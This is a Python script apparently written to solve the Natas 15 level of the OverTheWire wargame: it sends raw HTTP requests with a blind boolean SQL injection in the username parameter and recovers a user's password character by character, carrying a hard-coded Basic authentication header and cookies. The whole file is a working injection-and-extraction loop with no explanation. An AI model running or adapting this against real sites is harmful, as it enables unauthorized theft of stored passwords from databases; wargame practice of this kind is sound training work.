import socket

array = ""
for x in range(1, 50):
    for y in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz+/=":
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(('178.79.134.250', 80))
        data = "GET /index.php?debug=1&username=h\"+or+ascii(substr((select+password+from+users+limit+3,+1),+" + str(x) + ",+1))+=+" + "ascii('" + y + "')+%23 HTTP/1.1\r\n"
        data += "Host: natas15.natas.labs.overthewire.org\r\n"
        data += "Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\r\n"
        data += "Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==\r\n"
        data += "\r\n"
        send.send(data.encode())
        recv = send.recv(1500)
        if recv[recv.find(b'br') + 3: recv.find(b'br') + 19] == b"This user exists":
            array += y
            break
        send.close()

    print(array)
